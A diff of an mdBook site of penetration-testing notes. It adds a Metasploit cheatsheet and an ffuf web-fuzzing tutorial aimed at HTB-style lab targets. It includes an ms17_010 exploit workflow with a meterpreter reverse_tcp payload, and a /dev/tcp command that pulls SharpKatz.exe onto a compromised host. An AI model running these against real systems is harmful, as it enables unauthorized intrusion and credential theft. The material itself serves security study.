@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-b4e450f2.js";
+            window.path_to_searchindex_js = "searchindex-04f64a49.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-dbcff8a3.js"></script>
+        <script src="toc-f5648287.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -198,11 +198,12 @@
 <li><a href="#medusa-cheatsheet">medusa</a></li>
 <li><a href="#hydra-cheatsheet">hydra</a></li>
 <li><a href="#ranger-cheatsheet">Ranger</a></li>
+<li><a href="#metasploit-cheatsheet">Metasploit</a></li>
 <li><a href="#regex-cheatsheet">Regex</a></li>
 <li><a href="#sql-cheat-sheet">SQL</a></li>
 <li><a href="#multi-line-strings">yaml</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
-<li><a href="#hashcat">hashcat</a></li>
+<li><a href="#hashcat-1">hashcat</a></li>
 <li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
 <li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#powershell-file-transfer">powershell</a></li>
@@ -537,6 +538,9 @@
 <li><a href="#nmap-1">nmap</a></li>
 <li><a href="#medusa">medusa</a></li>
 <li><a href="#hydra">hydra</a></li>
+<li><a href="#ffuf">ffuf</a></li>
+<li><a href="#hashcat">hashcat</a></li>
+<li><a href="#metasploit-framework">metasploit</a></li>
 </ul>
 </li>
 <li><a href="troubleshooting/README.html">Troubleshooting</a>
@@ -580,10 +584,25 @@
 <li><a href="#cvss-common-vulnerability-scoring-system">CVSS</a></li>
 <li><a href="#openvas">openvas</a></li>
 <li><a href="#nessus">nessus</a></li>
+<li><a href="#laudanum">Laudanum</a></li>
 <li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
 <li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
 </ul>
 </li>
+</ul>
+</li>
+<li><a href="electronics/README.html">Electronics</a>
+<ul>
+<li><a href="#ohms-law">Laws</a></li>
+<li><a href="#resistors">Resistors</a></li>
+<li><a href="#capacitors">Capacitors</a></li>
+<li><a href="#inductors">Inductors</a></li>
+<li><a href="#diodes">Diodes</a></li>
+<li><a href="#transistors">Transistors</a></li>
+<li><a href="#operational-amplifiers">Operational Amplifiers</a></li>
+<li><a href="#digital-logic-gates">Digital Logic Gates</a></li>
+<li><a href="#555-timer-ic">555 Timer IC</a></li>
+<li><a href="#microcontrollers">Microcontrollers</a></li>
 </ul>
 </li>
 </ul>
@@ -594,12 +613,13 @@
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
 <li><a href="#cap-theorem">cap_theorem</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
-<li><a href="#hashcat">hashcat</a></li>
+<li><a href="#hashcat-1">hashcat</a></li>
 <li><a href="#standard-http-headers">http_headers</a></li>
 <li><a href="#hydra-cheatsheet">hydra</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#make-files">make_files</a></li>
 <li><a href="#medusa-cheatsheet">medusa</a></li>
+<li><a href="#metasploit-cheatsheet">metasploit</a></li>
 <li><a href="#ncat-file-transfer">ncat</a></li>
 <li><a href="#neovim-cheatsheet">neovim</a></li>
 <li><a href="#netcat-file-transfer">netcat</a></li>
@@ -1432,6 +1452,183 @@ sudo apt-get -y install medusa
 </div>
 <p><em>thx to the comments section for additional shortcuts! post your suggestions there!</em></p>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="metasploit-cheatsheet"><a class="header" href="#metasploit-cheatsheet">Metasploit Cheatsheet</a></h1>
+<h2 id="module-structure"><a class="header" href="#module-structure">Module Structure</a></h2>
+<pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
+</code></pre>
+<p>Example: <code>794 exploit/windows/ftp/scriptftp_list</code></p>
+<hr>
+<h2 id="module-types"><a class="header" href="#module-types">Module Types</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Auxiliary</strong></td><td>Scanning, fuzzing, sniffing, and admin capabilities</td></tr>
+<tr><td><strong>Encoders</strong></td><td>Ensure payloads are intact to their destination</td></tr>
+<tr><td><strong>Exploits</strong></td><td>Modules that exploit vulnerabilities for payload delivery</td></tr>
+<tr><td><strong>NOPs</strong></td><td>Keep payload sizes consistent across exploit attempts</td></tr>
+<tr><td><strong>Payloads</strong></td><td>Code that runs remotely and calls back to attacker</td></tr>
+<tr><td><strong>Plugins</strong></td><td>Additional scripts integrated within msfconsole</td></tr>
+<tr><td><strong>Post</strong></td><td>Wide array of modules to gather information, pivot deeper</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Note:</strong> Only <code>auxiliary</code>, <code>exploits</code>, and <code>post</code> modules can be used with <code>use &lt;no.&gt;</code> command.</p>
+<hr>
+<h2 id="searching-modules"><a class="header" href="#searching-modules">Searching Modules</a></h2>
+<h3 id="basic-search"><a class="header" href="#basic-search">Basic Search</a></h3>
+<pre><code class="language-bash">search &lt;keyword&gt;
+search eternalromance
+</code></pre>
+<h3 id="advanced-search-options"><a class="header" href="#advanced-search-options">Advanced Search Options</a></h3>
+<pre><code class="language-bash">search cve:2009 type:exploit
+search cve:2009 type:exploit platform:-linux
+search type:exploit platform:windows cve:2021 rank:excellent microsoft
+</code></pre>
+<h3 id="search-keywords"><a class="header" href="#search-keywords">Search Keywords</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Keyword</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>cve</code></td><td>Modules with matching CVE ID</td></tr>
+<tr><td><code>type</code></td><td>Module type (exploit, payload, auxiliary, etc.)</td></tr>
+<tr><td><code>platform</code></td><td>Target OS/platform</td></tr>
+<tr><td><code>rank</code></td><td>Exploitability rank (excellent, good, normal, etc.)</td></tr>
+<tr><td><code>port</code></td><td>Target port number</td></tr>
+<tr><td><code>author</code></td><td>Module author</td></tr>
+<tr><td><code>name</code></td><td>Module name</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="search-options"><a class="header" href="#search-options">Search Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-h</code></td><td>Show help information</td></tr>
+<tr><td><code>-o &lt;file&gt;</code></td><td>Output results to CSV file</td></tr>
+<tr><td><code>-S &lt;string&gt;</code></td><td>Regex pattern to filter results</td></tr>
+<tr><td><code>-u</code></td><td>Use module if there is one result</td></tr>
+<tr><td><code>-s &lt;column&gt;</code></td><td>Sort by column (rank, date, name, type, check)</td></tr>
+<tr><td><code>-r</code></td><td>Reverse sort order</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="module-selection--usage"><a class="header" href="#module-selection--usage">Module Selection &amp; Usage</a></h2>
+<h3 id="select-module"><a class="header" href="#select-module">Select Module</a></h3>
+<pre><code class="language-bash">use &lt;module_number&gt;
+use exploit/windows/smb/ms17_010_psexec
+</code></pre>
+<h3 id="view-module-options"><a class="header" href="#view-module-options">View Module Options</a></h3>
+<pre><code class="language-bash">show options
+</code></pre>
+<h3 id="set-required-options"><a class="header" href="#set-required-options">Set Required Options</a></h3>
+<pre><code class="language-bash">set RHOSTS &lt;target_ip&gt;
+set RHOSTS 10.10.10.40
+setg LHOST &lt;attacker_ip&gt;    # Global setting
+set LPORT 4444
+</code></pre>
+<h3 id="view-payloads"><a class="header" href="#view-payloads">View Payloads</a></h3>
+<pre><code class="language-bash">show payloads
+</code></pre>
+<h3 id="set-payload"><a class="header" href="#set-payload">Set Payload</a></h3>
+<pre><code class="language-bash">set payload windows/meterpreter/reverse_tcp
+</code></pre>
+<h3 id="execute-exploit"><a class="header" href="#execute-exploit">Execute Exploit</a></h3>
+<pre><code class="language-bash">run
+exploit
+</code></pre>
+<hr>
+<h2 id="common-options"><a class="header" href="#common-options">Common Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>RHOSTS</code></td><td>Target host(s) - required for most modules</td></tr>
+<tr><td><code>RHOST</code></td><td>Single target host</td></tr>
+<tr><td><code>RPORT</code></td><td>Target port (TCP)</td></tr>
+<tr><td><code>LHOST</code></td><td>Attacker’s IP address (for reverse shells)</td></tr>
+<tr><td><code>LPORT</code></td><td>Attacker’s listening port</td></tr>
+<tr><td><code>PAYLOAD</code></td><td>Payload to use</td></tr>
+<tr><td><code>TARGET</code></td><td>Target OS/architecture</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="useful-commands"><a class="header" href="#useful-commands">Useful Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>help</code></td><td>Show help menu</td></tr>
+<tr><td><code>help search</code></td><td>Search command help</td></tr>
+<tr><td><code>info &lt;module&gt;</code></td><td>Detailed module information</td></tr>
+<tr><td><code>check</code></td><td>Test if target is vulnerable (if supported)</td></tr>
+<tr><td><code>sessions</code></td><td>List active sessions</td></tr>
+<tr><td><code>sessions -i &lt;id&gt;</code></td><td>Interact with session</td></tr>
+<tr><td><code>background</code></td><td>Background current session</td></tr>
+<tr><td><code>setg</code></td><td>Set global option (persists across modules)</td></tr>
+<tr><td><code>unsetg</code></td><td>Unset global option</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="example-workflow"><a class="header" href="#example-workflow">Example Workflow</a></h2>
+<pre><code class="language-bash"># Start msfconsole
+msfconsole
+
+# Search for exploit
+search ms17_010
+
+# Select module
+use exploit/windows/smb/ms17_010_psexec
+
+# View options
+show options
+
+# Set target
+set RHOSTS 10.10.10.40
+
+# Set payload options
+setg LHOST 10.10.14.15
+set LPORT 4444
+
+# Check vulnerability (if supported)
+check
+
+# Run exploit
+run
+</code></pre>
+<hr>
+<h2 id="rank-levels"><a class="header" href="#rank-levels">Rank Levels</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Rank</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>excellent</strong></td><td>Exploit will never crash the service</td></tr>
+<tr><td><strong>great</strong></td><td>Exploit has a default target and auto-detects the target</td></tr>
+<tr><td><strong>good</strong></td><td>Exploit has a default target</td></tr>
+<tr><td><strong>normal</strong></td><td>Exploit is otherwise reliable</td></tr>
+<tr><td><strong>average</strong></td><td>Exploit is generally unreliable</td></tr>
+<tr><td><strong>low</strong></td><td>Exploit is nearly impossible to exploit</td></tr>
+<tr><td><strong>manual</strong></td><td>Exploit is unstable or difficult to exploit</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="regex-cheatsheet"><a class="header" href="#regex-cheatsheet">Regex Cheatsheet</a></h1>
 <p>Regular expressions (regex) are patterns used for string matching and manipulation. Here’s a quick reference guide for common regex syntax:</p>
 <h2 id="basics"><a class="header" href="#basics">Basics</a></h2>
@@ -1614,7 +1811,7 @@ SELECT name, sid FROM sys.sql_logins
 <pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="hashcat"><a href="#hashcat" class="header">hashcat</a></h1>
+<h1 id="hashcat-1"><a href="#hashcat-1" class="header">hashcat</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="wafw00f-cheatsheet"><a class="header" href="#wafw00f-cheatsheet">wafw00f Cheatsheet</a></h1>
 <h2 id="basic-usage"><a class="header" href="#basic-usage">Basic Usage</a></h2>
@@ -1983,7 +2180,7 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 <p><strong>Compromised machine (receiving via /dev/tcp):</strong></p>
 <pre><code class="language-bash">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
 </code></pre>
-<h2 id="common-options"><a class="header" href="#common-options">Common Options</a></h2>
+<h2 id="common-options-1"><a class="header" href="#common-options-1">Common Options</a></h2>
 <ul>
 <li><code>-l</code>: Listen mode</li>
 <li><code>-p &lt;port&gt;</code>: Specify port number</li>
@@ -2022,7 +2219,7 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 </code></pre>
 <p>Writing to this particular file makes Bash open a TCP connection to <code>host:port</code>, and this feature may be used for file transfers.</p>
 <p><strong>Note:</strong> The same operation can be used to transfer files from the compromised host to the attack host.</p>
-<h2 id="common-options-1"><a class="header" href="#common-options-1">Common Options</a></h2>
+<h2 id="common-options-2"><a class="header" href="#common-options-2">Common Options</a></h2>
 <ul>
 <li><code>-l</code>: Listen mode</li>
 <li><code>-p &lt;port&gt;</code>: Specify port number</li>
@@ -2066,7 +2263,7 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 </ol>
 <p>After selecting the drive, you can interact with it in the remote session that follows.</p>
 <p><strong>Note:</strong> This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>
-<h2 id="common-options-2"><a class="header" href="#common-options-2">Common Options</a></h2>
+<h2 id="common-options-3"><a class="header" href="#common-options-3">Common Options</a></h2>
 <h3 id="rdesktop"><a class="header" href="#rdesktop">rdesktop</a></h3>
 <ul>
 <li><code>-d &lt;domain&gt;</code>: Domain name</li>
@@ -22439,8 +22636,11 @@ PID        TTY     STAT   TIME          CMD
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
 <li><a href="#hydra">hydra</a></li>
+<li><a href="#metasploit-framework">metasploit</a></li>
 <li><a href="#nmap-1">nmap</a></li>
 <li><a href="#medusa">medusa</a></li>
+<li><a href="#metasploit-framework">metasploit</a></li>
+<li><a href="#hashcat">hashcat</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="need-to-addrefine"><a class="header" href="#need-to-addrefine">Need to add/refine:</a></h1>
@@ -23047,6 +23247,704 @@ sudo apt-get -y install hydra
 <li>Use <code>-f</code> to stop after the first successful login, and <code>-v</code>/<code>-V</code> for detailed output.</li>
 <li>Adjust <code>-t</code> to control parallel threads, balancing speed against detection risk.</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ffuf"><a class="header" href="#ffuf">FFuf</a></h1>
+<p>FFuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go. Tools such as ffuf provide us with a handy automated way to fuzz the web application’s individual components or a web page. This means, for example, that we use a list that is used to send requests to the webserver if the page with the name from our list exists on the webserver. If we get a response code 200, then we know that this page exists on the webserver, and we can look at it manually.</p>
+<p>Understanding how ffuf works is critical for effective web enumeration and penetration testing. The following topics will be discussed:</p>
+<ul>
+<li>Fuzzing for directories</li>
+<li>Fuzzing for files and extensions</li>
+<li>Identifying hidden vhosts</li>
+<li>Fuzzing for PHP parameters</li>
+<li>Fuzzing for parameter values</li>
+</ul>
+<hr>
+<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
+<p>The term <strong>fuzzing</strong> refers to a testing technique that sends various types of user input to a certain interface to study how it would react. If we were fuzzing for SQL injection vulnerabilities, we would be sending random special characters and seeing how the server would react. If we were fuzzing for a buffer overflow, we would be sending long strings and incrementing their length to see if and when the binary would break.</p>
+<p>We usually utilize pre-defined wordlists of commonly used terms for each type of test for web fuzzing to see if the webserver would accept them. This is done because web servers do not usually provide a directory of all available links and domains (unless terribly configured), and so we would have to check for various links and see which ones return pages.</p>
+<p>For example, if we visit a page that doesn’t exist, we would get an HTTP code <strong>404 Page Not Found</strong>. However, if we visit a page that exists, like <code>/login</code>, we would get the login page and get an HTTP code <strong>200 OK</strong>.</p>
+<p>This is the basic idea behind web fuzzing for pages and directories. Still, we cannot do this manually, as it will take forever. This is why we have tools that do this automatically, efficiently, and very quickly. Such tools send hundreds of requests every second, study the response HTTP code, and determine whether the page exists or not. Thus, we can quickly determine what pages exist and then manually examine them to see their content.</p>
+<hr>
+<h2 id="wordlists-1"><a class="header" href="#wordlists-1">Wordlists</a></h2>
+<p>To determine which pages exist, we should have a wordlist containing commonly used words for web directories and pages, very similar to a Password Dictionary Attack. Though this will not reveal all pages under a specific website, as some pages are randomly named or use unique names, in general, this returns the majority of pages, reaching up to 90% success rate on some websites.</p>
+<p>We will not have to reinvent the wheel by manually creating these wordlists, as great efforts have been made to search the web and determine the most commonly used words for each type of fuzzing. Some of the most commonly used wordlists can be found under the GitHub SecLists repository, which categorizes wordlists under various types of fuzzing, even including commonly used passwords.</p>
+<p>Within our PwnBox, we can find the entire SecLists repo available under <code>/opt/useful/SecLists</code>. The specific wordlist we will be utilizing for pages and directory fuzzing is another commonly used wordlist called directory-list-2.3, and it is available in various forms and sizes.</p>
+<p><strong>Tip:</strong> Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following in ffuf to get rid of these lines with the <code>-ic</code> flag.</p>
+<h3 id="common-wordlists"><a class="header" href="#common-wordlists">Common Wordlists</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Path</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Directory/Page</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td><td>General directory and file discovery</td></tr>
+<tr><td><strong>Extensions</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code></td><td>File extension variations</td></tr>
+<tr><td><strong>Domain</strong></td><td><code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>Subdomain enumeration</td></tr>
+<tr><td><strong>Parameters</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td><td>Common parameter names</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="directory-fuzzing-1"><a class="header" href="#directory-fuzzing-1">Directory Fuzzing</a></h2>
+<p>We start by learning the basics of using ffuf to fuzz websites for directories. The main two options are <code>-w</code> for wordlists and <code>-u</code> for the URL. We can assign a wordlist to a keyword to refer to it where we want to fuzz. For example, we can pick our wordlist and assign the keyword <code>FUZZ</code> to it by adding <code>:FUZZ</code> after it.</p>
+<p>Next, as we want to be fuzzing for web directories, we can place the <code>FUZZ</code> keyword where the directory would be within our URL.</p>
+<h3 id="basic-directory-fuzzing"><a class="header" href="#basic-directory-fuzzing">Basic Directory Fuzzing</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
+</code></pre>
+<ul>
+<li>Replaces <code>FUZZ</code> with each word from the wordlist</li>
+<li>Tests almost 90k URLs in less than 10 seconds</li>
+<li>Useful for finding admin panels, backup files, configuration files, and hidden endpoints</li>
+<li>Results show HTTP status codes (200, 301, 302, etc.) indicating which directories exist</li>
+</ul>
+<p><strong>Note:</strong> We can even make it go faster if we are in a hurry by increasing the number of threads to 200, for example, with <code>-t 200</code>, but this is not recommended, especially when used on a remote site, as it may disrupt it, and cause a Denial of Service, or bring down your internet connection in severe cases.</p>
+<hr>
+<h2 id="extension-fuzzing-1"><a class="header" href="#extension-fuzzing-1">Extension Fuzzing</a></h2>
+<p>In the previous section, we found that we had access to <code>/blog</code>, but the directory returned an empty page, and we cannot manually locate any links or pages. So, we will once again utilize web fuzzing to see if the directory contains any hidden pages. However, before we start, we must find out what types of pages the website uses, like <code>.html</code>, <code>.aspx</code>, <code>.php</code>, or something else.</p>
+<p>One common way to identify that is by finding the server type through the HTTP response headers and guessing the extension. For example, if the server is apache, then it may be <code>.php</code>, or if it was IIS, then it could be <code>.asp</code> or <code>.aspx</code>, and so on. This method is not very practical, though.</p>
+<p>So, we will again utilize ffuf to fuzz the extension, similar to how we fuzzed for directories. Instead of placing the <code>FUZZ</code> keyword where the directory name would be, we would place it where the extension would be <code>.FUZZ</code>, and use a wordlist for common extensions.</p>
+<p><strong>Note:</strong> The wordlist we chose already contains a dot (.), so we will not have to add the dot after “index” in our fuzzing.</p>
+<p>Before we start fuzzing, we must specify which file that extension would be at the end of! We can always use two wordlists and have a unique keyword for each, and then do <code>FUZZ_1.FUZZ_2</code> to fuzz for both. However, there is one file we can always find in most websites, which is <code>index.*</code>, so we will use it as our file and fuzz extensions on it.</p>
+<h3 id="extension-fuzzing-example"><a class="header" href="#extension-fuzzing-example">Extension Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
+</code></pre>
+<ul>
+<li>Tests extensions like <code>.php</code>, <code>.bak</code>, <code>.old</code>, <code>.txt</code>, etc.</li>
+<li>Common for finding backup files or alternative file formats</li>
+<li>Helps identify what technology stack the website uses</li>
+</ul>
+<hr>
+<h2 id="page-fuzzing-1"><a class="header" href="#page-fuzzing-1">Page Fuzzing</a></h2>
+<p>We will now use the same concept of keywords we’ve been using with ffuf, use <code>.php</code> as the extension, place our <code>FUZZ</code> keyword where the filename should be, and use the same wordlist we used for fuzzing directories.</p>
+<h3 id="page-fuzzing-example"><a class="header" href="#page-fuzzing-example">Page Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
+</code></pre>
+<ul>
+<li>Useful when you know the directory structure but want to find specific pages</li>
+<li>Can be combined with extension fuzzing for comprehensive discovery</li>
+<li>Results show which pages exist within the directory</li>
+</ul>
+<hr>
+<h2 id="recursive-fuzzing-1"><a class="header" href="#recursive-fuzzing-1">Recursive Fuzzing</a></h2>
+<p>So far, we have been fuzzing for directories, then going under these directories, and then fuzzing for files. However, if we had dozens of directories, each with their own subdirectories and files, this would take a very long time to complete. To be able to automate this, we will utilize what is known as <strong>recursive fuzzing</strong>.</p>
+<h3 id="recursive-flags"><a class="header" href="#recursive-flags">Recursive Flags</a></h3>
+<p>When we scan recursively, it automatically starts another scan under any newly identified directories that may have on their pages until it has fuzzed the main website and all of its subdirectories.</p>
+<p>Some websites may have a big tree of sub-directories, like <code>/login/user/content/uploads/...etc</code>, and this will expand the scanning tree and may take a very long time to scan them all. This is why it is always advised to specify a depth to our recursive scan, such that it will not scan directories that are deeper than that depth. Once we fuzz the first directories, we can then pick the most interesting directories and run another scan to direct our scan better.</p>
+<p>In ffuf, we can enable recursive scanning with the <code>-recursion</code> flag, and we can specify the depth with the <code>-recursion-depth</code> flag. If we specify <code>-recursion-depth 1</code>, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like <code>/login/user</code>, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with <code>-e .php</code>.</p>
+<p><strong>Note:</strong> We can still use <code>.php</code> as our page extension, as these extensions are usually site-wide.</p>
+<p>Finally, we will also add the flag <code>-v</code> to output the full URLs. Otherwise, it may be difficult to tell which <code>.php</code> file lies under which directory.</p>
+<h3 id="recursive-fuzzing-example"><a class="header" href="#recursive-fuzzing-example">Recursive Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+</code></pre>
+<ul>
+<li><code>-recursion</code>: Enables recursive directory fuzzing</li>
+<li><code>-recursion-depth</code>: Limits how deep to recurse (prevents infinite loops)</li>
+<li><code>-e</code>: Adds extensions to discovered directories</li>
+<li><code>-v</code>: Verbose output for better visibility</li>
+<li>The scan takes much longer, sent almost six times the number of requests, and the wordlist doubled in size (once with .php and once without)</li>
+</ul>
+<hr>
+<h2 id="dns-records-1"><a class="header" href="#dns-records-1">DNS Records</a></h2>
+<p>Once we accessed the page under <code>/blog</code>, we got a message saying Admin panel moved to academy.htb. If we visit the website in our browser, we get can’t connect to the server at www.academy.htb.</p>
+<p>This is because the exercises we do are not public websites that can be accessed by anyone but local websites within HTB. Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local <code>/etc/hosts</code> file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.</p>
+<p>If we visit the IP directly, the browser goes to that IP directly and knows how to connect to it. But in this case, we tell it to go to academy.htb, so it looks into the local <code>/etc/hosts</code> file and doesn’t find any mention of it. It asks the public DNS about it (such as Google’s DNS 8.8.8.8) and does not find any mention of it, since it is not a public website, and eventually fails to connect.</p>
+<p>So, to connect to academy.htb, we would have to add it to our <code>/etc/hosts</code> file:</p>
+<pre><code>sudo sh -c 'echo "SERVER_IP  academy.htb" &gt;&gt; /etc/hosts'
+</code></pre>
+<hr>
+<h2 id="sub-domain-fuzzing-1"><a class="header" href="#sub-domain-fuzzing-1">Sub-domain Fuzzing</a></h2>
+<p>In this section, we will learn how to use ffuf to identify sub-domains (i.e., <code>*.website.com</code>) for any website.</p>
+<h3 id="sub-domains"><a class="header" href="#sub-domains">Sub-domains</a></h3>
+<p>A sub-domain is any website underlying another domain. For example, <code>https://photos.google.com</code> is the photos sub-domain of google.com.</p>
+<p>In this case, we are simply checking different websites to see if they exist by checking if they have a public DNS record that would redirect us to a working server IP. So, let’s run a scan and see if we get any hits. Before we can start our scan, we need two things:</p>
+<ol>
+<li>A wordlist</li>
+<li>A target</li>
+</ol>
+<p>Luckily for us, in the SecLists repo, there is a specific section for sub-domain wordlists, consisting of common words usually used for sub-domains. We can find it in <code>/opt/useful/seclists/Discovery/DNS/</code>. In our case, we would be using a shorter wordlist, which is <code>subdomains-top1million-5000.txt</code>. If we want to extend our scan, we can pick a larger list.</p>
+<h3 id="sub-domain-fuzzing-example"><a class="header" href="#sub-domain-fuzzing-example">Sub-domain Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
+</code></pre>
+<ul>
+<li>Places <code>FUZZ</code> in the subdomain position</li>
+<li>Useful for finding hidden or forgotten subdomains</li>
+<li>Often reveals development, staging, or administrative interfaces</li>
+<li>Works for public domains with DNS records</li>
+</ul>
+<p><strong>Note:</strong> This method only works for public sub-domains with DNS records. For non-public sub-domains or VHosts, we need to use VHost fuzzing instead.</p>
+<hr>
+<h2 id="vhost-fuzzing-1"><a class="header" href="#vhost-fuzzing-1">VHost Fuzzing</a></h2>
+<p>As we saw in the previous section, we were able to fuzz public sub-domains using public DNS records. However, when it came to fuzzing sub-domains that do not have a public DNS record or sub-domains under websites that are not public, we could not use the same method. In this section, we will learn how to do that with VHost Fuzzing.</p>
+<h3 id="vhosts-vs-sub-domains"><a class="header" href="#vhosts-vs-sub-domains">VHosts vs. Sub-domains</a></h3>
+<p>The key difference between VHosts and sub-domains is that a <strong>VHost</strong> is basically a ‘sub-domain’ served on the same server and has the same IP, such that a single IP could be serving two or more different websites.</p>
+<p>VHosts may or may not have public DNS records.</p>
+<p>In many cases, many websites would actually have sub-domains that are not public and will not publish them in public DNS records, and hence if we visit them in a browser, we would fail to connect, as the public DNS would not know their IP. Once again, if we use the sub-domain fuzzing, we would only be able to identify public sub-domains but will not identify any sub-domains that are not public.</p>
+<p>This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.</p>
+<h3 id="vhost-fuzzing-example"><a class="header" href="#vhost-fuzzing-example">VHost Fuzzing Example</a></h3>
+<p>To scan for VHosts, without manually adding the entire wordlist to our <code>/etc/hosts</code>, we will be fuzzing HTTP headers, specifically the <code>Host:</code> header. To do that, we can use the <code>-H</code> flag to specify a header and will use the <code>FUZZ</code> keyword within it:</p>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
+</code></pre>
+<p>We see that all words in the wordlist are returning 200 OK! This is expected, as we are simply changing the header while visiting <code>http://academy.htb:PORT/</code>. So, we know that we will always get 200 OK. However, if the VHost does exist and we send a correct one in the header, we should get a different response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.</p>
+<hr>
+<h2 id="filtering-results"><a class="header" href="#filtering-results">Filtering Results</a></h2>
+<p>So far, we have not been using any filtering to our ffuf, and the results are automatically filtered by default by their HTTP code, which filters out code 404 NOT FOUND, and keeps the rest. However, as we saw in our previous run of ffuf, we can get many responses with code 200. So, in this case, we will have to filter the results based on another factor, which we will learn in this section.</p>
+<h3 id="filtering"><a class="header" href="#filtering">Filtering</a></h3>
+<p>Ffuf provides the option to match or filter out a specific HTTP code, response size, or amount of words. We can see that with <code>ffuf -h</code>:</p>
+<p><strong>MATCHER OPTIONS:</strong></p>
+<ul>
+<li><code>-mc</code>: Match HTTP status codes, or “all” for everything. (default: 200,204,301,302,307,401,403)</li>
+<li><code>-ml</code>: Match amount of lines in response</li>
+<li><code>-mr</code>: Match regexp</li>
+<li><code>-ms</code>: Match HTTP response size</li>
+<li><code>-mw</code>: Match amount of words in response</li>
+</ul>
+<p><strong>FILTER OPTIONS:</strong></p>
+<ul>
+<li><code>-fc</code>: Filter HTTP status codes from response. Comma separated list of codes and ranges</li>
+<li><code>-fl</code>: Filter by amount of lines in response. Comma separated list of line counts and ranges</li>
+<li><code>-fr</code>: Filter regexp</li>
+<li><code>-fs</code>: Filter HTTP response size. Comma separated list of sizes and ranges</li>
